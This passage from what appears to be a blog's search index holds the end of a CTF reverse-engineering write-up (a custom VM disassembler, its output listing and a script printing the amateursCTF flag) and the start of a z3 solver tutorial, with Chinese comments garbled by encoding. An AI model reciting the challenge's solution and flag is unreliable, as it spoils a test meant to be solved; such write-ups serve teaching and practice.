class="keyword">elif</span> b0 == <span class="number">43</span>:</span><br><span class="line">        fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    jmp <span class="subst">&#123;b1&#125;</span>\n&quot;</span>)</span><br><span class="line">        i += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> b0 == <span class="number">52</span>:</span><br><span class="line">        fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    push r<span class="subst">&#123;b1&#125;</span>\n&quot;</span>)</span><br><span class="line">        i += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> b0 == <span class="number">53</span>:</span><br><span class="line">        fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    pop r<span class="subst">&#123;b1&#125;</span>\n&quot;</span>)</span><br><span class="line">        i += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> b0 == <span class="number">54</span>:</span><br><span class="line">        fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    push <span class="subst">&#123;b1&#125;</span>\n&quot;</span>)</span><br><span class="line">        i += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> b0 == <span class="number">127</span>:</span><br><span class="line">        fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    quit\n&quot;</span>)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> i + <span class="number">1</span> &lt; <span class="built_in">len</span>(code) <span class="keyword">and</span> i + <span class="number">2</span> &lt; <span class="built_in">len</span>(code):<span class="comment">#è¿™æ˜¯ä¸€ä¸ªè§£å¯†å‡½æ•°</span></span><br><span class="line">            code[i] = b0 ^ b1 ^ b2</span><br><span class="line">            code[i + <span class="number">1</span>] = b1</span><br><span class="line">            code[i + <span class="number">2</span>] = b0</span><br></pre></td></tr></table></figure><p>æ ¹æ®code.jvmç”Ÿæˆæ­£ç¡®çš„ä»£ç ï¼Œç„¶åäººè„‘æ¨¡æ‹Ÿè¿è¡Œå¾—åˆ°flag</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">0 </span>   push <span class="number">32</span></span><br><span class="line"><span class="symbol">2 </span>   push <span class="number">62</span></span><br><span class="line"><span class="symbol">4 </span>   print_pop</span><br><span class="line"><span class="symbol">5 </span>   print_pop</span><br><span class="line"><span class="symbol">6 </span>   r0 += b2</span><br><span class="line"><span class="symbol">9 </span>   r0 += r0</span><br><span class="line"><span class="symbol">12 </span>   r0 += r0</span><br><span class="line"><span class="symbol">15 </span>   r0 += b2</span><br><span class="line"><span class="symbol">18 </span>   rdpush</span><br><span class="line"><span class="symbol">19 </span>   r0 -= <span class="number">1</span></span><br><span class="line"><span class="symbol">22 </span>   jmp <span class="number">18</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">25 </span>   jmp <span class="number">44</span></span><br><span class="line"><span class="symbol">27 </span>   push <span class="number">83</span></span><br><span class="line"><span class="symbol">29 </span>   push <span class="number">69</span></span><br><span class="line"><span class="symbol">31 </span>   push <span class="number">89</span></span><br><span class="line"><span class="symbol">33 </span>   print_pop</span><br><span class="line"><span class="symbol">34 </span>   print_pop</span><br><span class="line"><span class="symbol">35 </span>   print_pop</span><br><span class="line"><span class="symbol">36 </span>   quit</span><br><span class="line"><span class="symbol">37 </span>   push <span class="number">79</span></span><br><span class="line"><span class="symbol">39 </span>   push <span class="number">78</span></span><br><span class="line"><span class="symbol">41 </span>   print_pop</span><br><span class="line"><span class="symbol">42 </span>   print_pop</span><br><span class="line"><span class="symbol">43 </span>   quit</span><br><span class="line"><span class="symbol">44 </span>   pop r0</span><br><span class="line"><span class="symbol">46 </span>   r0 -= <span class="number">125</span></span><br><span class="line"><span class="symbol">49 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">52 </span>   pop r0</span><br><span class="line"><span class="symbol">54 </span>   r0 -= <span class="number">9</span></span><br><span class="line"><span class="symbol">57 </span>   r0 -= <span class="number">54</span></span><br><span class="line"><span class="symbol">60 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">63 </span>   pop r2</span><br><span class="line"><span class="symbol">65 </span>   r2 -= <span class="number">10</span></span><br><span class="line"><span class="symbol">68 </span>   r2 -= <span class="number">99</span></span><br><span class="line"><span class="symbol">71 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r2</span><br><span class="line"><span class="symbol">74 </span>   pop r2</span><br><span class="line"><span class="symbol">76 </span>   r2 -= <span class="number">21</span></span><br><span class="line"><span class="symbol">79 </span>   r2 -= <span class="number">97</span></span><br><span class="line"><span class="symbol">82 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r2</span><br><span class="line"><span class="symbol">85 </span>   pop r0</span><br><span class="line"><span class="symbol">87 </span>   r0 -= <span class="number">95</span></span><br><span class="line"><span class="symbol">90 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">93 </span>   pop r0</span><br><span class="line"><span class="symbol">95 </span>   r1 += b2</span><br><span class="line"><span class="symbol">98 </span>   <span class="keyword">swap</span> r0 r1</span><br><span class="line"><span class="symbol">100 </span>   r1 += r1</span><br><span class="line"><span class="symbol">103 </span>   r2 += b2</span><br><span class="line"><span class="symbol">106 </span>   r0 += r0</span><br><span class="line"><span class="symbol">109 </span>   r2 -= <span class="number">1</span></span><br><span class="line"><span class="symbol">112 </span>   jmp <span class="number">106</span> <span class="keyword">if</span> r2</span><br><span class="line"><span class="symbol">115 </span>   r0 += b2</span><br><span class="line"><span class="symbol">118 </span>   r0 -= r1</span><br><span class="line"><span class="symbol">121 </span>   r1 -= r1</span><br><span class="line"><span class="symbol">124 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">127 </span>   pop r0</span><br><span class="line"><span class="symbol">129 </span>   r0 -= <span class="number">95</span></span><br><span class="line"><span class="symbol">132 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">135 </span>   pop r1</span><br><span class="line"><span class="symbol">137 </span>   r1 -= <span class="number">1</span></span><br><span class="line"><span class="symbol">140 </span>   r1 -= <span class="number">115</span></span><br><span class="line"><span class="symbol">143 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r1</span><br><span class="line"><span class="symbol">146 </span>   pop r2</span><br><span class="line"><span class="symbol">148 </span>   r2 -= <span class="number">3</span></span><br><span class="line"><span class="symbol">151 </span>   r2 -= <span class="number">107</span></span><br><span class="line"><span class="symbol">154 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r2</span><br><span class="line"><span class="symbol">157 </span>   pop r1</span><br><span class="line"><span class="symbol">159 </span>   r1 -= <span class="number">3</span></span><br><span class="line"><span class="symbol">162 </span>   r1 -= <span class="number">112</span></span><br><span class="line"><span class="symbol">165 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r1</span><br><span class="line"><span class="symbol">168 </span>   pop r0</span><br><span class="line"><span class="symbol">170 </span>   r0 -= <span class="number">7</span></span><br><span class="line"><span class="symbol">173 </span>   r0 -= <span class="number">98</span></span><br><span class="line"><span class="symbol">176 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">179 </span>   pop r0</span><br><span class="line"><span class="symbol">181 </span>   r0 -= <span class="number">95</span></span><br><span class="line"><span class="symbol">184 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">187 </span>   pop r0</span><br><span class="line"><span class="symbol">189 </span>   r0 -= <span class="number">4</span></span><br><span class="line"><span class="symbol">192 </span>   r0 -= <span class="number">48</span></span><br><span class="line"><span class="symbol">195 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">198 </span>   pop r3</span><br><span class="line"><span class="symbol">200 </span>   r3 -= <span class="number">11</span></span><br><span class="line"><span class="symbol">203 </span>   r3 -= <span class="number">107</span></span><br><span class="line"><span class="symbol">206 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r3</span><br><span class="line"><span class="symbol">209 </span>   pop r3</span><br><span class="line"><span class="symbol">211 </span>   r3 -= <span class="number">4</span></span><br><span class="line"><span class="symbol">214 </span>   r3 -= <span class="number">48</span></span><br><span class="line"><span class="symbol">217 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r3</span><br><span class="line"><span class="symbol">220 </span>   pop r1</span><br><span class="line"><span class="symbol">222 </span>   r1 -= <span class="number">19</span></span><br><span class="line"><span class="symbol">225 </span>   r1 -= <span class="number">87</span></span><br><span class="line"><span class="symbol">228 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r1</span><br><span class="line"><span class="symbol">231 </span>   pop r0</span><br><span class="line"><span class="symbol">233 </span>   r0 -= <span class="number">95</span></span><br><span class="line"><span class="symbol">236 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">239 </span>   pop r2</span><br><span class="line"><span class="symbol">241 </span>   r2 -= <span class="number">26</span></span><br><span class="line"><span class="symbol">244 </span>   r2 -= <span class="number">84</span></span><br><span class="line"><span class="symbol">247 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r2</span><br><span class="line"><span class="symbol">250 </span>   pop r2</span><br><span class="line"><span class="symbol">252 </span>   r2 -= <span class="number">4</span></span><br><span class="line"><span class="symbol">255 </span>   r2 -= <span class="number">48</span></span><br><span class="line"><span class="symbol">258 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r2</span><br><span class="line"><span class="symbol">261 </span>   pop r1</span><br><span class="line"><span class="symbol">263 </span>   r1 -= <span class="number">7</span></span><br><span class="line"><span class="symbol">266 </span>   r1 -= <span class="number">44</span></span><br><span class="line"><span class="symbol">269 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r1</span><br><span class="line"><span class="symbol">272 </span>   pop r1</span><br><span class="line"><span class="symbol">274 </span>   r1 -= <span class="number">15</span></span><br><span class="line"><span class="symbol">277 </span>   r1 -= <span class="number">94</span></span><br><span class="line"><span class="symbol">280 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r1</span><br><span class="line"><span class="symbol">283 </span>   pop r0</span><br><span class="line"><span class="symbol">285 </span>   r0 -= <span class="number">95</span></span><br><span class="line"><span class="symbol">288 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">291 </span>   pop r1</span><br><span class="line"><span class="symbol">293 </span>   r1 -= <span class="number">41</span></span><br><span class="line"><span class="symbol">296 </span>   r1 -= <span class="number">44</span></span><br><span class="line"><span class="symbol">299 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r1</span><br><span class="line"><span class="symbol">302 </span>   pop r2</span><br><span class="line"><span class="symbol">304 </span>   r2 -= <span class="number">39</span></span><br><span class="line"><span class="symbol">307 </span>   r2 -= <span class="number">72</span></span><br><span class="line"><span class="symbol">310 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r2</span><br><span class="line"><span class="symbol">313 </span>   pop r2</span><br><span class="line"><span class="symbol">315 </span>   r2 -= <span class="number">45</span></span><br><span class="line"><span class="symbol">318 </span>   r2 -= <span class="number">76</span></span><br><span class="line"><span class="symbol">321 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r2</span><br><span class="line"><span class="symbol">324 </span>   pop r0</span><br><span class="line"><span class="symbol">326 </span>   r0 -= <span class="number">95</span></span><br><span class="line"><span class="symbol">329 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">332 </span>   pop r0</span><br><span class="line"><span class="symbol">334 </span>   r0 -= <span class="number">7</span></span><br><span class="line"><span class="symbol">337 </span>   r0 -= <span class="number">41</span></span><br><span class="line"><span class="symbol">340 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">343 </span>   pop r1</span><br><span class="line"><span class="symbol">345 </span>   r1 -= <span class="number">35</span></span><br><span class="line"><span class="symbol">348 </span>   r1 -= <span class="number">65</span></span><br><span class="line"><span class="symbol">351 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r1</span><br><span class="line"><span class="symbol">354 </span>   pop r0</span><br><span class="line"><span class="symbol">356 </span>   r0 -= <span class="number">95</span></span><br><span class="line"><span class="symbol">359 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">362 </span>   pop r2</span><br><span class="line"><span class="symbol">364 </span>   r2 -= <span class="number">44</span></span><br><span class="line"><span class="symbol">367 </span>   r2 -= <span class="number">72</span></span><br><span class="line"><span class="symbol">370 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r2</span><br><span class="line"><span class="symbol">373 </span>   pop r3</span><br><span class="line"><span class="symbol">375 </span>   r3 -= <span class="number">4</span></span><br><span class="line"><span class="symbol">378 </span>   r3 -= <span class="number">48</span></span><br><span class="line"><span class="symbol">381 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r3</span><br><span class="line"><span class="symbol">384 </span>   pop r3</span><br><span class="line"><span class="symbol">386 </span>   r3 -= <span class="number">0</span></span><br><span class="line"><span class="symbol">389 </span>   r3 -= <span class="number">104</span></span><br><span class="line"><span class="symbol">392 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r3</span><br><span class="line"><span class="symbol">395 </span>   pop r0</span><br><span class="line"><span class="symbol">397 </span>   r0 -= <span class="number">28</span></span><br><span class="line"><span class="symbol">400 </span>   r0 -= <span class="number">91</span></span><br><span class="line"><span class="symbol">403 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">406 </span>   pop r0</span><br><span class="line"><span class="symbol">408 </span>   r0 -= <span class="number">123</span></span><br><span class="line"><span class="symbol">411 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">414 </span>   pop r0</span><br><span class="line"><span class="symbol">416 </span>   r0 -= <span class="number">70</span></span><br><span class="line"><span class="symbol">419 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">422 </span>   pop r0</span><br><span class="line"><span class="symbol">424 </span>   r0 -= <span class="number">84</span></span><br><span class="line"><span class="symbol">427 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">430 </span>   pop r0</span><br><span class="line"><span class="symbol">432 </span>   r0 -= <span class="number">67</span></span><br><span class="line"><span class="symbol">435 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">438 </span>   pop r0</span><br><span class="line"><span class="symbol">440 </span>   r0 -= <span class="number">115</span></span><br><span class="line"><span class="symbol">443 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">446 </span>   pop r0</span><br><span class="line"><span class="symbol">448 </span>   r0 -= <span class="number">114</span></span><br><span class="line"><span class="symbol">451 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">454 </span>   pop r0</span><br><span class="line"><span class="symbol">456 </span>   r0 -= <span class="number">117</span></span><br><span class="line"><span class="symbol">459 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">462 </span>   pop r0</span><br><span class="line"><span class="symbol">464 </span>   r0 -= <span class="number">101</span></span><br><span class="line"><span class="symbol">467 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">470 </span>   pop r0</span><br><span class="line"><span class="symbol">472 </span>   r0 -= <span class="number">116</span></span><br><span class="line"><span class="symbol">475 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">478 </span>   pop r0</span><br><span class="line"><span class="symbol">480 </span>   r0 -= <span class="number">97</span></span><br><span class="line"><span class="symbol">483 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">486 </span>   pop r0</span><br><span class="line"><span class="symbol">488 </span>   r0 -= <span class="number">109</span></span><br><span class="line"><span class="symbol">491 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">494 </span>   pop r0</span><br><span class="line"><span class="symbol">496 </span>   r0 -= <span class="number">97</span></span><br><span class="line"><span class="symbol">499 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">502 </span>   jmp <span class="number">27</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">q</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(a),end =<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#å¯¹åº”æ¯ä¸€ä¸ªå¾ªç¯æ¡ä»¶</span></span><br><span class="line"></span><br><span class="line">q(<span class="number">97</span>)</span><br><span class="line">q(<span class="number">109</span>)</span><br><span class="line">q(<span class="number">97</span>)</span><br><span class="line">q(<span class="number">116</span>)</span><br><span class="line">q(<span class="number">101</span>)</span><br><span class="line">q(<span class="number">117</span>)</span><br><span class="line">q(<span class="number">114</span>)</span><br><span class="line">q(<span class="number">115</span>)</span><br><span class="line">q(<span class="number">67</span>)</span><br><span class="line">q(<span class="number">84</span>)</span><br><span class="line">q(<span class="number">70</span>)</span><br><span class="line">q(<span class="number">123</span>)</span><br><span class="line">q(<span class="number">28</span>+<span class="number">91</span>)</span><br><span class="line">q(<span class="number">104</span>)</span><br><span class="line">q(<span class="number">4</span>+<span class="number">48</span>)</span><br><span class="line">q(<span class="number">44</span>+<span class="number">72</span>)</span><br><span class="line">q(<span class="number">95</span>)</span><br><span class="line">q(<span class="number">35</span>+<span class="number">65</span>)</span><br><span class="line">q(<span class="number">7</span>+<span class="number">41</span>)</span><br><span class="line">q(<span class="number">95</span>)</span><br><span class="line">q(<span class="number">45</span>+<span class="number">76</span>)</span><br><span class="line">q(<span class="number">39</span>+<span class="number">72</span>)</span><br><span class="line">q(<span class="number">41</span>+<span class="number">44</span>)</span><br><span class="line">q(<span class="number">95</span>)</span><br><span class="line">q(<span class="number">15</span>+<span class="number">94</span>)</span><br><span class="line">q(<span class="number">7</span>+<span class="number">44</span>)</span><br><span class="line">q(<span class="number">4</span>+<span class="number">48</span>)</span><br><span class="line">q(<span class="number">26</span>+<span class="number">84</span>)</span><br><span class="line">q(<span class="number">95</span>)</span><br><span class="line">q(<span class="number">19</span>+<span class="number">87</span>)</span><br><span class="line">q(<span class="number">4</span>+<span class="number">48</span>)</span><br><span class="line">q(<span class="number">11</span>+<span class="number">107</span>)</span><br><span class="line">q(<span class="number">4</span>+<span class="number">48</span>)</span><br><span class="line">q(<span class="number">95</span>)</span><br><span class="line">q(<span class="number">7</span>+<span class="number">98</span>)</span><br><span class="line">q(<span class="number">115</span>)</span><br><span class="line">q(<span class="number">110</span>)</span><br><span class="line">q(<span class="number">116</span>)</span><br><span class="line">q(<span class="number">95</span>)</span><br><span class="line">q(<span class="number">65</span>)</span><br><span class="line">q(<span class="number">95</span>)</span><br><span class="line">q(<span class="number">97</span>+<span class="number">21</span>)</span><br><span class="line">q(<span class="number">10</span>+<span class="number">99</span>)</span><br><span class="line">q(<span class="number">9</span>+<span class="number">54</span>)</span><br><span class="line">q(<span class="number">125</span>)</span><br><span class="line"><span class="comment">#amateursCTF&#123;wh4t_d0_yoU_m34n_j4v4_isnt_A_vm?&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> é€†å‘ </category>
          
          <category> æŠ€èƒ½ </category>
          
          <category> ç»¼åˆä¿æŠ¤ </category>
          
          <category> VM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é€†å‘ </tag>
            
            <tag> VM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>z3åŸºæœ¬è¯­æ³•</title>
      <link href="/posts/b4d67d75.html"/>
      <url>/posts/b4d67d75.html</url>
      
        <content type="html"><![CDATA[<p>z3æ˜¯ä¸€ä¸ªçº¦æŸæ±‚è§£å™¨ï¼Œå¯ä»¥ç†è§£ä¸ºè§£æ–¹ç¨‹çš„å·¥å…·ï¼Œæ¯ä¸€ä¸ªçº¦æŸéƒ½è¦å†™åœ¨x.addçš„è¯­å¥ä¸­ã€‚</p><h2 id="å£°æ˜å˜é‡">å£°æ˜å˜é‡</h2><p>z3ä¸€å…±æœ‰ä¸‰ç§å˜é‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a,b = Int(<span class="string">&#x27;a b&#x27;</span>)<span class="comment">#å£°æ˜å¤šä¸ªæ•´æ•°å‹å˜é‡</span></span><br><span class="line">a = Real(<span class="string">&#x27;a&#x27;</span>)<span class="comment">#å£°æ˜å•ä¸ªå®å‹å˜é‡</span></span><br><span class="line">a,b = Bitvec(<span class="string">&#x27;a b&#x27;</span>,<span class="number">8</span>)<span class="comment">#å£°æ˜å¤šä¸ª8ä½çš„å‘é‡å‹å˜é‡</span></span><br></pre></td></tr></table></figure><h2 id="ä½¿ç”¨ä¾‹">ä½¿ç”¨ä¾‹</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a,b = Int(<span class="string">&#x27;a b&#x27;</span>)</span><br><span class="line">solve(a+b == <span class="number">10</span>,a + <span class="number">3</span> * b ==<span class="number">12</span>)<span class="comment">#æ¡ä»¶å°‘æ—¶å¯ä»¥ç›´æ¥ç”¨solveä¸ç”¨add</span></span><br><span class="line"><span class="comment">#result : [b = 1,a = 9]</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">x=Int(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">y=Int(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (simplify(x + y + <span class="number">2</span>*x + <span class="number">3</span>))<span class="comment">#simplifyç”¨äºæ‰“å°åŒ–ç®€åçš„è¡¨è¾¾å¼</span></span><br><span class="line"><span class="built_in">print</span> (simplify(x &lt; y + x + <span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span> (simplify(And(x + <span class="number">1</span> &gt;= <span class="number">3</span>, x**<span class="number">2</span> + x**<span class="number">2</span> + y**<span class="number">2</span> + <span class="number">2</span> &gt;= <span class="number">5</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#3 + 3*x + y</span></span><br><span class="line"><span class="comment">#Not(y &lt;= -2)</span></span><br><span class="line"><span class="comment">#And(x &gt;= 2, 2*x**2 + y**2 &gt;= 3)</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">a,b = Ints(<span class="string">&#x27;a b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s=Solver()  <span class="comment">#åˆ›å»ºä¸€ä¸ªè§£çš„å¯¹è±¡s</span></span><br><span class="line">s.add(a + b == <span class="number">10</span>)<span class="comment">#æ·»åŠ çº¦æŸæ¡ä»¶</span></span><br><span class="line">s.add(a + <span class="number">3</span> * b == <span class="number">12</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat: <span class="comment">#check() æ£€æŸ¥è§£æ˜¯å¦å­˜åœ¨ï¼Œå­˜åœ¨ä¼šreturn &#x27;sat&#x27;</span></span><br><span class="line">result = s.model() <span class="comment">#è¾“å‡º</span></span><br><span class="line"></span><br><span class="line"><span 